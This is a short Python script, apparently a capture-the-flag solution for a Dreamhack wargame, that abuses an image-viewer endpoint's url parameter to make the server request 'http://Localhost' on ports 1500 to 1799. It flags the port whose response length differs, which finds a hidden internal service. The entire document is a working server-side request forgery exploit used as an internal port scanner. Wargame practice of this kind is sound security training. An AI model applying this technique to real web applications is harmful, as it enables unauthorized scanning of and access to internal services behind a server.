import requests
for port in range(1500, 1800):
    res = requests.post('http://host1.dreamhack.games:15312/img_viewer', data={'url': 'http://Localhost:' + str(port)})
    print(port)
    if len(res.text) != 65121:
        print('random port: ' + str(port))
        break
